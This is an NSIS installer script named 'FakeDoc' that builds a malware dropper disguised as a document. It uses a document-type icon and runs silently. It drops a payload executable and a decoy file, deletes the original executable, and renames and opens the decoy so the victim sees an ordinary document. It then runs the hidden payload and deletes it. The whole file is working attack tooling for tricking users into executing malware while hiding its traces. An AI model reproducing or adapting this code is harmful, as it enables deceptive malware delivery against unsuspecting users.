
   /*************\
   *             *
   *   FakeDoc   *
   *             *
   \*************/

; Defines:
; --------
; TYPE
; OUTPUT
; DROPPER
; DOCUMENT

!include 'FileFunc.nsh'
!include 'LogicLib.nsh'

Name ""
Icon "resources\${TYPE}.ico"
OutFile "${OUTPUT}"

RequestExecutionLevel user

Var argv
Var stage1
Var stage2
Var dropper
Var document
Var basename
Var directory

Function .onInit

   SetSilent silent

FunctionEnd

Function un.onInit

   SetSilent silent

FunctionEnd

Section "Install"

   GetTempFileName $0
   StrCpy $stage2 "$0.1.exe"
   GetTempFileName $0
   StrCpy $dropper "$0.2.exe"
   GetTempFileName $0
   StrCpy $document "$0.3.dat"

   WriteUninstaller "$stage2"
   File "/oname=$dropper" "${DROPPER}"
   File "/oname=$document" "${DOCUMENT}"

   Exec '"$stage2" /o1 "$EXEPATH" /o2 "$stage2" /o3 "$dropper" /o4 "$document"'

SectionEnd

Section "Uninstall"

   ${GetParameters} $argv
   ${GetOptions} "$argv" "/o1" $stage1
   ${GetOptions} "$argv" "/o2" $stage2
   ${GetOptions} "$argv" "/o3" $dropper
   ${GetOptions} "$argv" "/o4" $document

   ${Do}
      ClearErrors
      Delete "$stage1"
      IfErrors +2
      ${Break}
      Sleep 300
   ${Loop}

   ${GetBaseName} "$stage1" $basename
   ${GetParent} "$stage1" $directory

   Rename "$document" "$directory\$basename.${TYPE}"
   ExecShell "" "$directory\$basename.${TYPE}"

   ${Do}
      ClearErrors
      Delete "$stage2"
      IfErrors +2
      ${Break}
      Sleep 300
   ${Loop}

   ExecWait '"$dropper"'
   Delete "$dropper"

SectionEnd